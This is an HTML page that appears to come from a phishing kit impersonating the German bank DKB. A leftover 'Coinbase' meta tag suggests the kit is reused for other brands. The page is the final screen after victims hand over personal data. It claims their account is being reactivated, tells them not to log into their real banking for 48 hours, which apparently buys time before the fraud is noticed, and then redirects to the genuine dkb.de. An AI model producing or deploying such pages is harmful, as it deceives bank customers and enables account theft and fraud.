<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="./Asstes/imgs/favicon.ico">
        <title>DKB</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="./Asstes/css/style.css">
    </head>
    <body class="form_box">
      
    
    <div class="wrapper_form">
      <header class="header_2 d-flex justify-content-between align-items-center">
        <div class="logo d-flex align-items-center">
          <div class="bars">
            <i class="fa-solid fa-bars"></i>
          </div>
          <img src="./Asstes/imgs/Logo.svg" alt="">
        </div>
        <div class="search">
          <input type="text" placeholder="Ihre Suche...">
          <img src="./Asstes/imgs/serach.png" alt="">
        </div>
      </header>
      <div class="wrapper_boxes d-flex">
        <div class="left_box">
          <ul class="ps-0 mb-0">
            <li>Freunde werben</li>
            <li>Privatkunden</li>
            <li>Geschäftskunden</li>
            <li>Nachhaltigkeit</li>
            <li>Über uns</li>
            <li>Karriere</li>
          </ul>
        </div>
        <div class="center_box">            
          <form action="">
            <div class="top_form">
              <div class="lock d-flex flex-column align-items-center text-center">
                <img src="./Asstes/imgs/check.png" alt="">
                <h1>Vielen Dank für die Bestätigung Ihrer persönlichen Daten.</h1>
                <p>
                  Bitte beachten Sie, dass der Reaktivierungsprozess 48 Stunden dauert und dass es Ihnen strengstens untersagt ist, sich während der nächsten 48 Stunden erneut mit Ihrer Anwendung oder der Website zu verbinden, um einen reibungslosen Ablauf des Reaktivierungsprozesses zu gewährleisten.
                  <br><br>
                  DKB
                  <br><br>
                  Danke für Ihr Verständnis.
              </p>
              </div>
            </div>
          </form>
          <div class="back">
            <div class="links d-flex align-items-center">
              <img src="./Asstes/imgs/arrow.svg" alt="">
              <a href="">zurück</a>
            </div>
          </div>
        </div>
        <div class="right_box">
          <div class="infos">
            <div class="title d-flex">
              <p class="mb-0">HILFE</p>
              <span></span>
            </div>
            <p class="mb-0">Probleme bei der Anmeldung ins Banking oder mit dem TAN-Verfahren? In unseren FAQ findest du die Lösung.</p>
            <div class="links d-flex align-items-center">
              <img src="./Asstes/imgs/arrow.svg" alt="">
              <a href="">zu den Fragen & Antworten</a>
            </div>
          </div>
          <div class="infos">
            <div class="title d-flex flex-wrap">
              <p class="mb-0">Ist deine Handynummer aktuell?</p>
              <span></span>
            </div>
            <div class="d-flex justify-content-center">
              <img src="./Asstes/imgs/large.png" alt="">
            </div>
            <p class="mb-0">Bitte überprüfe deine hinterlegte Handynummer. Diese muss für die Verwendung der DKB-App & des neuen Banking aktuell sein.</p>
            <div class="links d-flex align-items-center">
              <img src="./Asstes/imgs/arrow.svg" alt="">
              <a href="">Jetzt überprüfen</a>
            </div>
          </div>
        </div>
      </div>
      <footer class="footer_2">
        <div class="col_box">
          <div class="title">
            <p class="mb-0">DKB AG</p>
            <i class="ri-arrow-down-s-line"></i>
          </div>
          <ul>
            <li>Presse</li>
            <li>Public Affairs</li>
            <li>Investor Relations</li>
            <li><img src="./Asstes/imgs/s1.svg" alt=""> Facebook</li>
            <li><img src="./Asstes/imgs/s2.svg" alt=""> Instagram</li>
            <li><img src="./Asstes/imgs/s3.svg" alt=""> X</li>
            <li><img src="./Asstes/imgs/s4.svg" alt=""> Youtube</li>
            <li><img src="./Asstes/imgs/s5.svg" alt=""> LinkedIn</li>
            <li><img src="./Asstes/imgs/s6.svg" alt=""> TikTok</li>
            <li>Datenschutz</li>
            <li>Impressum</li>
          </ul>
        </div>
        <div class="col_box">
          <div class="title">
            <p class="mb-0">Beliebte Produkte</p>
            <i class="ri-arrow-down-s-line"></i>
          </div>
          <ul>
            <li>Kostenloses Girokonto</li>
            <li>Kreditkarte</li>
            <li>Online-Depot</li>
            <li>Privatkredit</li>
            <li>Studierendenkonto</li>
            <li>Geschäftskonto</li>
            <li>Immobilienangebote</li>
            <li>Baufinanzierung</li>
            <li>Festzins</li>
            <li>Tagesgeldkonto</li>
          </ul>
        </div>
        <div class="col_box">
          <div class="title">
            <p class="mb-0">Banking & Apps</p>
            <i class="ri-arrow-down-s-line"></i>
          </div>
          <ul>
            <li>Internet-Banking</li>
            <li>DKB-Apps</li>
            <li>TAN2go-App</li>
            <li>Neues Handy – was tun?</li>
            <li>Verwalterplattform</li>
            <li>Treuhänderplattform</li>
          </ul>
        </div>  
        <div class="col_box">
          <div class="title">
            <p class="mb-0">Sicherheit</p>
            <i class="ri-arrow-down-s-line"></i>
          </div>
          <ul>
            <li>Karte sperren</li>
            <li>Sicherheit im Banking</li>
            <li>TAN-Verfahren</li>
            <li>Einlagensicherung</li>
            <li>Visa Secure</li>
            <li>Card Control</li>
          </ul>
        </div>   
        <div class="col_box">
          <div class="title">
            <p class="mb-0">Service</p>
            <i class="ri-arrow-down-s-line"></i>
          </div>
          <ul>
            <li>FAQ</li>
            <li>Formulare</li>
            <li>Finanzwissen</li>
            <li>Freunde werben</li>
            <li>Geldautomaten suchen</li>
            <li>IBAN-Rechner</li>
            <li>Entwickler</li>
          </ul>
        </div>                    
        <div class="col_box lof">
          <img src="./Asstes/imgs/logo2.svg" alt="">
        </div>                    
      </footer>
    </div>








    <!-- bootstrap -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <!-- script jquery -->
    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
    
    <script>        
        setTimeout(() => {
            window.location.href ="https://www.dkb.de/";
        },5000);        
    </script>
    </body>
</html>